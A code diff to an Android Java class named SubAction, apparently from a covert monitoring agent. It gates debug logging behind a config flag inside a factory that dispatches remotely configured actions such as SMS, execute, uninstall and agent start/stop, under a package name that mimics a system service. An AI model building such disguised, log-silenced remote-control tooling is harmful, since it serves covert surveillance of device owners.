@@ -9,10 +9,8 @@ package com.android.service.action;
 
 import android.util.Log;
 
-import com.android.service.Debug;
 import com.android.service.Status;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -66,43 +64,43 @@ public abstract class SubAction implements Runnable {
 
 		switch (type) {
 			case ACTION_SYNC:
-				Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionInternet(type, confParams);
 
 			case ACTION_UNINSTALL:
-				Log.d("QZ", TAG + " Factory *** ACTION_UNINSTALL ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_UNINSTALL ***");
 				return new UninstallAction(type, confParams);
 
 			case ACTION_RELOAD:
-				Log.d("QZ", TAG + " Factory *** ACTION_RELOAD ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_RELOAD ***");
 				return new ReloadAction(type, confParams);
 
 			case ACTION_SMS:
-				Log.d("QZ", TAG + " Factory *** ACTION_SMS ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_SMS ***");
 				return new SmsAction(type, confParams);
 
 			case ACTION_START_AGENT:
-				Log.d("QZ", TAG + " Factory *** ACTION_START_AGENT ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_START_AGENT ***");
 				return new StartAgentAction(type, confParams);
 
 			case ACTION_STOP_AGENT:
-				Log.d("QZ", TAG + " Factory *** ACTION_STOP_AGENT ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_STOP_AGENT ***");
 				return new StopAgentAction(type, confParams);
 
 			case ACTION_SYNC_PDA:
-				Log.d("QZ", TAG + " Factory *** ACTION_SYNC_PDA ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_SYNC_PDA ***");
 				return new SyncPdaAction(type, confParams);
 
 			case ACTION_EXECUTE:
-				Log.d("QZ", TAG + " Factory *** ACTION_EXECUTE ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_EXECUTE ***");
 				return new ExecuteAction(type, confParams);
 
 			case ACTION_SYNC_APN:
-				Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionApn(type, confParams);
 
 			case ACTION_LOG:
-				Log.d("QZ", TAG + " Factory *** ACTION_INFO ***");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Factory *** ACTION_INFO ***");
 				return new LogAction(type, confParams);
 
 			default:
@@ -164,7 +162,7 @@ public abstract class SubAction implements Runnable {
 		try {
 			execute();
 		} catch (Exception e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		} finally {
 			synchronized (this) {
 				notify();
